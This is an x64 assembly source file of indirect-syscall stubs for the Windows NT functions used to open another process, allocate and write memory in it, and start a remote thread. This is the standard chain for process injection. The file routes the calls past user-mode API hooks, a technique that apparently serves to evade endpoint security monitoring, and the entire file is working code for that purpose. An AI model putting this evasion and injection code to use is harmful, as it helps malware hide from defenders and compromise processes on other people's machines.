.data 
;---------------------------------------------------------------
; DIRECT SYSCALLS
extern g_NtOpenProcessSSN:DWORD
extern g_NtAllocateVirtualMemorySSN:DWORD
extern g_NtWriteVirtualMemorySSN:DWORD
extern g_NtCreateThreadExSSN:DWORD
extern g_NtWaitForSingleObjectSSN:DWORD
extern g_NtCloseSSN:DWORD

;---------------------------------------------------------------
; INDIRECT SYSCALLS
; You can just use one syscall instruction instead of 
; getting them for all the functions you use.
extern g_NtOpenProcessSyscall:QWORD
extern g_NtAllocateVirtualMemorySyscall:QWORD
extern g_NtWriteVirtualMemorySyscall:QWORD
extern g_NtCreateThreadExSyscall:QWORD
extern g_NtWaitForSingleObjectSyscall:QWORD
extern g_NtCloseSyscall:QWORD

.code
NtOpenProcess proc
		mov r10, rcx
		mov eax, g_NtOpenProcessSSN       
		jmp qword ptr g_NtOpenProcessSyscall                         
		ret                             
NtOpenProcess endp

NtAllocateVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtAllocateVirtualMemorySSN      
		jmp qword ptr g_NtAllocateVirtualMemorySyscall                        
		ret                             
NtAllocateVirtualMemory endp

NtWriteVirtualMemory proc
		mov r10, rcx
		mov eax, g_NtWriteVirtualMemorySSN      
		jmp qword ptr g_NtWriteVirtualMemorySyscall                        
		ret                             
NtWriteVirtualMemory endp

NtCreateThreadEx proc
		mov r10, rcx
		mov eax, g_NtCreateThreadExSSN      
		jmp qword ptr g_NtCreateThreadExSyscall                        
		ret                             
NtCreateThreadEx endp

NtWaitForSingleObject proc
		mov r10, rcx
		mov eax, g_NtWaitForSingleObjectSSN      
		jmp qword ptr g_NtWaitForSingleObjectSyscall                        
		ret                             
NtWaitForSingleObject endp

NtClose proc
		mov r10, rcx
		mov eax, g_NtCloseSSN      
		jmp qword ptr g_NtCloseSyscall                        
		ret                             
NtClose endp
end
